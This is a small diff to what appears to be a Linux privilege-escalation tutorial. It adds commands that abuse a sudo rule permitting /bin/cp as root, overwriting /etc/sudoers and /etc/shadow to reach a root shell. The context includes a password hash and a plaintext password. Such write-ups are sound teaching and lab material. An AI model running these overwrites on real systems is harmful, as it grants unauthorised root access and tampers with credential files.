@@ -446,6 +446,7 @@ franky	ALL=(root)	:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
 ```
 
 ```
+[franky@ubuntu]$ cp -f sudoers_Im_Coming /etc/sudoers
 [franky@ubuntu]$ sudo -s 
 [root@ubuntu]# 
 ```
@@ -469,6 +470,7 @@ franky:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtK
 ```
 
 ```
+[franky@ubuntu]$ cp -f my_shadow /etc/shadow
 [franky@ubuntu]$ su tester
 [tester@ubuntu]$ sudo -s
 Password: 3d2yhijinbe
